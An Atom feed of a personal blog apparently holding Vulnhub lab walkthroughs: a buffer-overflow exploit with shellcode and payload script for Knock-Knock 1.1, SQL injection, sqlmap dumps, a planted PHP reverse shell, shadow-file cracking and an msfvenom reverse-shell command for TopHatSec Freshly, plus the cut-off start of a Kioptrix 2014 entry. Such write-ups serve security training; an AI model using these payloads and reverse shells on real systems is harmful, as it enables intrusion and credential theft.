<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-06-21T06:09:07-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Knock-Knock: 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1/"/>
    <updated>2015-06-21T04:49:54-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Pretty much thought of a pretty neat idea I hadn&rsquo;t seen done before with a VM, and I wanted to turn it into reality!
Your job is to escalate to root, and find the flag.
Since I&rsquo;ve gotten a few PM&rsquo;s, remember: There is a difference between &#8220;Port Unreachable&rdquo; and &ldquo;Host Unreachable&rdquo;. DHCP is not broken ;)
Gotta give a huge shoutout to c0ne for helping to creating the binary challenge, and rasta_mouse and recrudesce for testing :)
Also, gotta thank barrebas who was able to find a way to make things easier&hellip; but of course that is fixed with this update! ;)&ldquo; &ndash; <font color="green"><em>zer0w1re</em></font></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/knock-knock-11,105/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Port knocking brute-force to open the hidden ports</li>
<li>Secret information hidden in picture</li>
<li>Buffer Overflow analysis and exploit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Analysis and write script to brute force port knocking</li>
<li>Port scanned again to dicover the real open ports [<font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture and reveal the hidden information</li>
<li>Crack the cipher text to get login creditional in plain text [<font color="FF8000">Caesar shift with ROT 13</font>]</li>
<li>Login SSH with cracked login creditional</li>
<li>Look around and found suspicious program with SUID bit set</li>
<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.140 in this case).</p>

<p><img class="left" src="/downloads/knock-knock/1.png"></p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, only TCP port 1337 has been discovered running on Ubuntu Linux.
<code>nmap -v -sV -A -O -T4 -p- 10.10.10.140</code></p>

<p><img class="left" src="/downloads/knock-knock/2.png"></p>

<h3>Port knocking</h3>

<p>In order to understand what Port Knocking is and how it works, I found the following 2 links: <a href="http://www.portknocking.org/">link_1</a>, <a href="https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu">link_2</a>.</p>

<p>Basically, I need to send SYN request to several random ports (3 in this case) in correct orders and valid time period, then the firewall or proxy will change the rules to open hidden ports.</p>

<p><img class="left" src="/downloads/knock-knock/3.png"></p>

<p>Due to there are 3 ports and total 6 possible orders for the sequence, I wrote a script to try all the possibilities.</p>

<p><figure class='code'><figcaption><span>knock.py  (knock.py)</span> <a href='/downloads/code/knock.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutations</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.140&quot;</span>			<span class="c">#target IP</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">Knockports</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>	<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
</span><span class='line'>		<span class="k">try</span><span class="p">:</span>
</span><span class='line'>			<span class="k">print</span> <span class="s">&quot;[*] Knocking on port: &quot;</span><span class="p">,</span> <span class="n">port</span>
</span><span class='line'>			<span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>			<span class="c"># set timeout in 0.1s</span>
</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>		<span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>			<span class="k">print</span> <span class="s">&quot;[-] </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">e</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>	<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>				<span class="c">#connect to port 1337 to grab three random ports</span>
</span><span class='line'>	<span class="n">r</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>	
</span><span class='line'>	<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">print</span> <span class="s">&quot;received: &quot;</span><span class="p">,</span> <span class="n">r</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">for</span> <span class="n">comb</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>		<span class="c"># try all the possibility of 3-ports orders </span>
</span><span class='line'>		<span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Trying sequence </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
</span><span class='line'>		<span class="n">Knockports</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">print</span> <span class="s">&quot;[*] Done&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/knock-knock/4.png"></p>

<p>After run the script, use nmap to check open services.</p>

<p><img class="left" src="/downloads/knock-knock/5.png"></p>

<p>Now two more ports discovered: <code>22</code> and <code>80</code>.</p>

<p>Next I run nikto scan on port 80 and Dirbuster to guess hidden paths as standard procedure but nothing found, only the knock knock picture. So I downloaded the picture and use command <code>strings</code> to check if there is anything hidden in the the picture.</p>

<p><img class="left" src="/downloads/knock-knock/6.png"></p>

<p>Bingo! Very juicy information found in the end:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw90w</span></code></pre></td></tr></table></div></figure></p>

<p>After tried several different encryption methods, I found this is encrypted by <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> with ROT-13. There is an useful online <a href="http://www.xarg.org/tools/caesar-cipher/">Caesarian cipher decryption tool</a> which allow me to decrypt cipher text in different ROT number to detect the correct ROT number.</p>

<p>After decrypted:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>abfnW       -     nosaJ
</span><span class='line'>sax2Cw9Ow   -     fnk2Pj9Bj</span></code></pre></td></tr></table></div></figure></p>

<p>They are actually backwards, so the Login Credential is</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username: Jason
</span><span class='line'>password: jB9jP2knf</span></code></pre></td></tr></table></div></figure></p>

<p>Now I can SSH login to the target (I tried &lsquo;Jason&rsquo; first but failed, when I tried all lower case &lsquo;jason&rsquo;, it works)</p>

<p><img class="left" src="/downloads/knock-knock/7.png"></p>

<h3>Shell Escape</h3>

<p>Due to the current shell is Restricted, I use python <code>python -c "import pty; pty.spawn('/bin/bash')"</code> to escape.</p>

<p><img class="left" src="/downloads/knock-knock/8.png"></p>

<p>By poking around, I found a binary program &lsquo;tfc&rsquo; with SUID bit set which normally can help us to get ROOT.</p>

<p><img class="left" src="/downloads/knock-knock/9.png"></p>

<p>This is a file encryption program, first argument is the input file (plain text) and the second argument is the output file (cipher text), both of the input and output have to be <code>.tfc</code> extension.</p>

<p><img class="left" src="/downloads/knock-knock/10.png"></p>

<p>As we can see above, reverse the input file and output file, it will decrypt the cipher text.</p>

<p>Now let&rsquo;s try a large file to see if it has Buffer Overflow vulnerability.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ python -c &ldquo;print &lsquo;A&rsquo;*5000&rdquo; > in.tfc
</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure></p>

<p>Segmentation fault!! sounds like it has BoF. Then I use <a href="link:%20http://www.trapkit.de/tools/checksec.html">searchsec.sh</a> to check what protections are enabled on it.</p>

<p><img class="left" src="/downloads/knock-knock/11.png"></p>

<p>Cool, there is no any protection at all!</p>

<p>Due to gdb is not installed on the target machine, I have to download the tfc program to my Kali for further analyzing.</p>

<p><img class="left" src="/downloads/knock-knock/12.png"></p>

<p>Why here is <code>0x0675c916</code> but not expected <code>0x41414141</code>? After playing around and further analysis, this should be encrypted of <code>0x41414141</code>. So I need the payload encrypted first. Thanks to <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>. He provided a method to get encrypted data from core dump file. This method will save lots of time and works to reverse engineering the <code>tfc</code> program for re-writing the encryption script.</p>

<p>Next, I need to find where is the offset to just change the EIP. After tried several varying lengths and checking the value of return address in gdb. I finally found the offset to overwrite the return address (4124 bytes).</p>

<p>Due to 4 &lsquo;A&rsquo;s always starts with same bytes &#8216;def0 5bab&rsquo; in encrypted file, So &lsquo;def0 5bab&rsquo; can be used as a pattern to locate encrypted data in core dump file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c &lsquo;print &ldquo;A&rdquo; * 100&rsquo; > in.tfc
</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;p>File crypted, goodbye!
</span><span class='line'>root@kali:~# xxd out.tfc | head
</span><span class='line'>0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c &lsquo;print &ldquo;A&rdquo; * 5000&rsquo; > in.tfc
</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>root@kali:~# xxd core | grep &lsquo;def0 5bab&rsquo;
</span><span class='line'>0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p>

<p>Next, use <code>msfelfscan</code> to get jmp esp address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfelfscan -j esp tfc
</span><span class='line'>[tfc]
</span><span class='line'>0x08048e93 jmp esp
</span><span class='line'>0x08048e93 jmp esp</span></code></pre></td></tr></table></div></figure></p>

<p>Then use msf with payload (<font color="red"><em>linux/x86/exec</em></font>) to generate shellcode</p>

<p><img class="left" src="/downloads/knock-knock/13.png"></p>

<p><code>-b</code> switch will blacklist special characters.</p>

<p>Then I wrote a python script to output payload with shellcode.</p>

<p><figure class='code'><figcaption><span>payload.py  (payload.py)</span> <a href='/downloads/code/payload.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xb8\x87\x10\x54\x8e\xd9\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x31\x46\x15\x83\xc6\x04\x03\x46\x11\xe2\x72\x7a\x5f\xd6\xe5\x29\x39\x8e\x38\xad\x4c\xa9\x2a\x1e\x3c\x5e\xaa\x08\xed\xfc\xc3\xa6\x78\xe3\x41\xdf\x73\xe4\x65\x1f\xab\x86\x0c\x71\x9c\x35\xa6\x8d\xb5\xea\xbf\x6f\xf4\x8d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4124</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span>				<span class="c"># 0x08048e93 jmp esp</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span> 						<span class="c"># padding 20 NOPs to protect shellcode</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5000</span> <span class="o">-</span> <span class="mi">4124</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span><span class="mi">20</span> <span class="o">-</span><span class="mi">70</span><span class="p">)</span>	<span class="c"># padding with &#39;C&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">content</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Next, use <code>tfc</code> program to encrypt the payload and dump the encrypted data from core dump</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# python payload.py > in.tfc
</span><span class='line'>root@kali:~/Knock# ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>root@kali:~/Knock# xxd /tmp/core-tfc-11-0-0-18419-1434802506 | grep &lsquo;def0 5bab&rsquo;
</span><span class='line'>0034340: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p>

<p>Then use <code>dd</code> to carve out the encrypted data, byte by byte, skipping the first 213824 bytes (0034340 in HEX) and count is the length of exploit payload (5000 bytes)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# dd if=/tmp/core-tfc-11-0-0-18419-1434802506 of=exp.tfc skip=213824 count=5000 bs=1
</span><span class='line'>5000+0 records in
</span><span class='line'>5000+0 records out
</span><span class='line'>5000 bytes (5.0 kB) copied, 0.0723968 s, 69.1 kB/s</span></code></pre></td></tr></table></div></figure></p>

<p>Now try to exploit &lsquo;tfc&rsquo; program with the encrypted exploit payload (exp.tfc):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# ./tfc exp.tfc pwn.tfc&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=0(root) gid=0(root) groups=0(root)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>exit&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Cool, it works on my Kali!</p>

<p>Now, upload <code>exp.tfc</code> to target machine and exploit <code>tfc</code> to get ROOT!</p>

<p><img class="left" src="/downloads/knock-knock/14.png"></p>

<p>Done :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]TopHatSec: Freshly]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly/"/>
    <updated>2015-06-13T04:57:26-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly</id>
    <content type="html"><![CDATA[<p>&ldquo;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)
There are a couple of different ways that you can go with this one. Good luck!&rdquo; &ndash; <font color="green"><em>TopHatSec</em></font></p>

<p>&ldquo;VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.</a>&rdquo; &ndash; <font color="green"><em>VulnHub</em></font></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/130604105?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>login.php - SQL Injection Vulnerability</li>
<li>weak/same passwords used</li>
<li>/etc/shadow file world readable</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox]</li>
<li>Web application scanned to dig more information about web service [nikto]</li>
<li>Exploit SQL injection vulnerability and dump wordpress admin password [sqlmap]</li>
<li>Upload PHP reverse shell and read /etc/passwd and /etc/shadow to greb sensitive information</li>
<li>Use john the ripper for brute-force cracking to get root&rsquo;s password</li>
<li>Generate and upload Linux meterpreter reverse shell and login as root with cracked password</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80, 443 and 8080 have been discovered and the web server is apache 2.4.7 running on Ubuntu Linux.</p>

<p>Due to only web services are found, I decided to use <em>nikto</em> firstly to dig more information on port 80 and got the following result:</p>

<p><img class="left" src="/downloads/freshly/1.png"></p>

<p>An login page has been found by <em>nikto</em> and I access <code>http://10.10.10.134/login.php</code> on firefox, it shows a login form with username and password input box.</p>

<p>Simply try some weak passwords such as <code>admin/admin</code> and get <code>0</code> responded which means login failed.</p>

<p>Then I tested simple SQL injection statements such as <code>' or 1=1 -- -</code> in username box and anything in password box, this time the server response <code>1</code> which means login successful.</p>

<p>Based on the test result, I know here is SQL injection vulnerability.</p>

<p>Now fire up <em>SQLMAP</em> to exploit it automatically.</p>

<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --dbs</code></p>

<p><img class="left" src="/downloads/freshly/2.png"></p>

<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --smart --batch --dump -T users -D wordpress8080</code></p>

<p><img class="left" src="/downloads/freshly/3.png"></p>

<p>Here we are, the wordpress admin credential has been dumped:</p>

<p><font color="red">admin / SuperSecretPassword</font></p>

<p>Next, modify the pentestmonkey&rsquo;s PHP reverse shell&#8217; IP and port to my Kali&rsquo;s port 5555 and setup NC to listen on this port.</p>

<p>Then by using the collected admin credential, I successfully logged in wordpress dashboard on server&rsquo;s port 8080.</p>

<p>Then go to <code>Appearance --&gt; Editor --&gt; function.php</code>, delete all the content and paste the reverse shell&rsquo;s php code before &ldquo;Update File&rdquo;</p>

<p>Now we got a shell with limited privilege. After poking around the file system, I read the passwd file which the secrets saved in the file too. Surprisingly, the shadow file also can be read.</p>

<p>So dump the passwd and shadow file to my kali and add all found passwords (<em>SuperSecretPassword</em>) into the dictionary file (I use <em>rockyou.txt</em> here)</p>

<p>Then use <em>john the ripper</em> to crack the hashes and got the following result:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo &ldquo;SuperSecretPassword&rdquo; > ~/tmp/dict.txt
</span><span class='line'>cat /usr/share/wordlists/rockyou.txt >> ~/tmp/dict.txt
</span><span class='line'>unshadow passwd.txt shadow.txt > unshadow.txt
</span><span class='line'>john unshadow.txt &ndash;wordlist=~/tmp/dict.txt</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/freshly/4.png"></p>

<p>Bingo! the root user use the same password as wordpress admin.</p>

<p>In the meantime of cracking the passwords, I create and upload linux meterpreter reverse shell (<em>lmp443</em>) to target server in order to get a better interactive shell.</p>

<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.131 LPORT=443 -f elf &gt; /var/www/lmp443</code></p>

<p>Then set up Metasploit on my Kali to use exploit <code>php/meterpreter/reverse_tcp</code> and listen on port <code>443</code></p>

<p>Then trigger the shell and get a meterpreter shell back to my Kali. Finally, use <code>su</code> command with cracked root password to get ROOT.</p>

<p><img class="left" src="/downloads/freshly/5.png"></p>

<h2>Appendix</h2>

<p><strong>All passwords found/cracked:</strong></p>

<p><strong>Wordpress password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin / SuperSecretPassword</span></code></pre></td></tr></table></div></figure></p>

<p><strong>login.php password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>candyshop / password
</span><span class='line'>Sir / PopRocks</span></code></pre></td></tr></table></div></figure></p>

<p><strong>MySQL password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword</span></code></pre></td></tr></table></div></figure></p>

<p><strong>User password:</strong></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword
</span><span class='line'>user / SuperSecretPassword
</span><span class='line'>candycane / password</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Kioptrix 2014]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014/"/>
    <updated>2015-05-25T00:54:33-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/25/vulnhub-kioptrix-2014</id>
    <content type="html"><![CDATA[<p>This is probably the last/final version of Kioptrix challenge VM, after played with all of those well designed vulnerable boxes, I would say they are challenging and enjoyable, not only for juniors like me :) but also the Pen tester pros will make fun from them. Cheers to <strong><em>loneferret</em></strong> and <strong><em>haken29a</em></strong>.</p>

<p>So back to Kioptrix 2014, more details can be found in this vulnhub website <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">link</a>, which including VM download links, walkthroughs, bug fixes (highly recommended to read Description when first running the VM) and blah blah blah &hellip;</p>

<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/128762761?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Kioptrix 2014 (<em>10.10.10.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a></li>
